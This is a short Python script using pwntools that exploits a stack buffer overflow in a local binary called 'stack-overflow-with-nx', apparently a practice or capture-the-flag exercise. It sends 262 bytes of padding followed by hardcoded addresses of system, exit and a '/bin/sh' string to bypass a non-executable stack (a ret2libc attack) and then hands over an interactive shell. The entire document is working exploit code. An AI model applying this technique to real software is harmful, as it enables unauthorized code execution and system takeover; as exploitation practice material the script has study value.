from pwn import *


# start the vuln program
p = process('./stack-overflow-with-nx')
system_addr = p32(0xf7e02830)
exit_addr = p32(0xf7df5170)
bin_sh_addr = p32(0xf7f4f352)
payload = b'A' * 262
payload += system_addr
payload += exit_addr
payload += bin_sh_addr
p.sendline(payload)
p.interactive()
